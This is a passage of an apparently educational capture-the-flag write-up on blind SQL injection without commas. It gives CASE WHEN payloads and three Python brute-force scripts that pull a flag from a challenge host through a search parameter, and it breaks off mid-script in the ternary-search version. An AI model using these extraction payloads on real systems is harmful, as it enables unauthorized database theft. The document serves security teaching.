@@ -1,0 +1,270 @@
+Here, SQL query is composed by string concatenation, so there is an obvious SQL injection vulnerability. If you pass in `?tag='`, the SQL query will fail. For the convenience of debugging, the SQL query will be printed out when an error occurs.
+
+A very intuitive way to retrieve other data is to use `union`, but this trick doesn't work here because the parameter we pass in is separated by commas, so there can be no commas in our payload, otherwise the entire query will be messed up and become very strange.
+
+Therefore, one of the interesting things about this question is how to use this vulnerability without using commas.
+
+A simple and intuitive way is to use `case when` with `sleep`, like this:
+
+``` sql
+(select case when (content like "c%") then 1 else sleep(1) end from flag)
+```
+
+From the response time of the response, we can infer whether the condition is met or not. However, because the code blocks sleep, we cannot use it in this way (the original case did not block this, but I added it separately).
+
+But if you observe carefully, you will find that we don't need to use sleep. We can use the return value of `case when` to perform the original filtering function and infer which condition is met from the result, like this:
+
+``` sql
+(select case when (content like "c%") then 1 else 10 end from flag)
+```
+
+When the condition (`content like 'c%'`) is met, the return value is 1, otherwise it is 10. If it is 1, the returned JSON will have data, otherwise it won't. Therefore, we can know whether the condition is met based on whether there is data or not.
+
+Next, let's write a script for this simplest method.
+
+``` python
+# exploit-search.py
+import requests
+import datetime
+import json
+
+host = 'https://od-php.herokuapp.com/sql'
+char_index = 0
+char_set = 'abcdefghijklmnopqrstuvwxyz}_'
+result = 'cymetrics{'
+while True:
+  if char_index >= len(char_set):
+    print("end")
+    break
+
+  char = char_set[char_index]
+  payload = f'(select case when (content like "{result}{char}%") then 1 else 10 end from flag)'
+  response = requests.get(f'{host}/search.php?tag={payload}')
+  print("trying", char)
+  if response.ok:
+    data = json.loads(response.text)
+    if len(data) > 0:
+      result += char
+      print(result)
+      char_index = 0
+    else:
+      char_index += 1
+
+  else:
+    print('error')
+    print(response.text)
+    break
+
+```
+
+Simply put, each character is continuously tested until it is found. It is simple and violent but effective. It takes about three to five minutes to run, and the execution process will be like this:
+
+![](/img/sql-injection-in-action/p1.png)
+
+If it is a challenge like this, where we know the table name and column name in advance, the execution time may be longer, but three to five minutes is still within an acceptable range. However, in actual cases, we may not know anything and need to go to the information_schema to retrieve various information before dumping the entire database.
+
+Therefore, we need a more efficient approach.
+
+### Speed up: Try three at once
+
+In fact, if we observe carefully, we can control four types of return results:
+
+1. home1 and home2 appear together (when the tag is 1)
+2. Only home1 appears (when the tag is 2)
+3. Only home2 appears (when the tag is 5)
+4. Neither of them appear (when the tag is 10)
+
+And in the previous attack method, we only used two of these situations. If we use all four, the speed will triple.
+
+The way to use it is very simple. We can change from trying one at a time to trying three at a time, like this:
+
+``` sql
+(select case
+  when (content like "a%") then 1
+  when (content like "b%") then 2
+  when (content like "c%") then 5
+  else 10
+end from flag)
+```
+
+One query can try three characters, and the speed is tripled. The script is as follows:
+
+``` python
+# exploit-search-3x.py
+import requests
+import datetime
+import json
+import urllib.parse
+import time
+
+def print_success(raw):
+  print(f"\033[92m{raw}\033[0m")
+
+def encode(raw):
+  return urllib.parse.quote(raw.encode('utf8'))
+
+host = 'https://od-php.herokuapp.com/sql'
+char_index = 0
+char_set = '}abcdefghijklmnopqrstuvwxyz_'
+result = 'cymetrics{'
+
+start = time.time()
+while True:
+  found = False
+  for i in range(0, len(char_set), 3):
+    chars = char_set[i:i+3]
+    while len(chars) < 3:
+      chars += 'a'
+    payload = f'''
+    (select case
+      when (content like "{result+chars[0]}%") then 1  
+      when (content like "{result+chars[1]}%") then 2  
+      when (content like "{result+chars[2]}%") then 5
+      else 10
+     end from flag)
+    '''
+    print("trying " + str(chars))
+    response = requests.get(f'{host}/search.php?tag={encode(payload)}')
+    if response.ok:
+      data = json.loads(response.text)
+      if len(data) == 2:
+        result+=chars[0]
+        found = True
+      elif len(data) == 0:
+        continue
+      else:
+        found = True
+        if data[0]["name"] == "home1":
+          result+=chars[1]
+        else:
+          result+=chars[2]
+
+    else:
+      print('error')
+      print(response.text)
+      break
+
+    if found:
+      print_success("found: " + result)
+      break
+
+  if not found:
+    print("end")
+    print(response.text)
+    break
+
+print(f"time: {time.time() - start}s")
+```
+
+The result of running it looks like this:
+
+![](/img/sql-injection-in-action/p2.png)
+
+It took about 90 seconds to get the answer, which is much faster than before.
+
+Assuming n is the length of the string, and our character set has about 27 characters, in the worst case, we need 27n attempts to get the flag. With this method, we only need 27n/3 = 9n attempts.
+
+However, this is still not fast enough. Since we already have three types of results, why not use them in a different way?
+
+### Further acceleration: Ternary search
+
+Instead of trying three at a time, we can try "three groups of three" by dividing the original character set into three equal parts, such as `}abcdefghijklmnopqrstuvwxyz_`, which can be divided into:
+
+1. }abcdefgh
+2. ijklmnopq
+3. rstuvwxyz_
+
+We can check if the character is in a specific group by using the following SQL query:
+
+``` sql
+(select case
+  when (
+    (content like 'cymetrics{}%') or
+    (content like 'cymetrics{a%') or
+    (content like 'cymetrics{b%') or
+    (content like 'cymetrics{c%') or
+    (content like 'cymetrics{d%') or
+    (content like 'cymetrics{e%') or
+    (content like 'cymetrics{f%') or
+    (content like 'cymetrics{g%') or
+    (content like 'cymetrics{h%')
+  ) then 1
+  when (
+    (content like 'cymetrics{i%') or
+    (content like 'cymetrics{j%') or
+    (content like 'cymetrics{k%') or
+    (content like 'cymetrics{l%') or
+    (content like 'cymetrics{m%') or
+    (content like 'cymetrics{n%') or
+    (content like 'cymetrics{o%') or
+    (content like 'cymetrics{p%') or
+    (content like 'cymetrics{q%')
+  ) then 2
+  when (
+    (content like 'cymetrics{r%') or
+    (content like 'cymetrics{s%') or
+    (content like 'cymetrics{t%') or
+    (content like 'cymetrics{u%') or
+    (content like 'cymetrics{v%') or
+    (content like 'cymetrics{w%') or
+    (content like 'cymetrics{x%') or
+    (content like 'cymetrics{y%') or
+    (content like 'cymetrics{z%') or
+    (content like 'cymetrics{\_%')
+  ) then 5
+  else 10
+end from flag)
+```
+
+Each time it is divided into three equal parts for searching, it becomes a ternary search. In the worst case, the number of attempts required is reduced from 9n to 3n. The script is as follows (the ternary search part is a bit messy and may contain bugs):
+
+``` python
+# exploit-search-teanary.py
+import requests
+import time
+import json
+import urllib.parse
+
+def print_success(raw):
+  print(f"\033[92m{raw}\033[0m")
+
+def encode(raw):
+  return urllib.parse.quote(raw.encode('utf8'))
+
+host = 'https://od-php.herokuapp.com/sql'
+char_index = 0
+char_set = '}abcdefghijklmnopqrstuvwxyz_'
+result = 'cymetrics{'
+
+is_over = False
+start = time.time()
+while True:
+  print_success("result: " + result)
+  if is_over:
+    break
+
+  found = False
+  L = 0
+  R = len(char_set) - 1
+  while L<=R:
+    s = (R-L) // 3
+    ML = L + s
+    MR = L + s * 2
+    if s == 0:
+      MR = L + 1
+
+    group = [
+      char_set[L:ML],
+      char_set[ML:MR],
+      char_set[MR:R+1]
+    ]
+
+    conditions = []
+    for i in range(0, 3):
+      if len(group[i]) == 0:
+        # 空的話加上 1=2，一個恆假的條件
+        conditions.append("1=2")
+        continue
+      # 這邊要對 _ 做處理，加上 /，否則 _ 會配對到任意一個字元
+      arr = [f"(content like '{result}{chr(92) + c if c == '_' else c}%')" for c in group[i]]
+      conditions.append(" or ".join(arr))
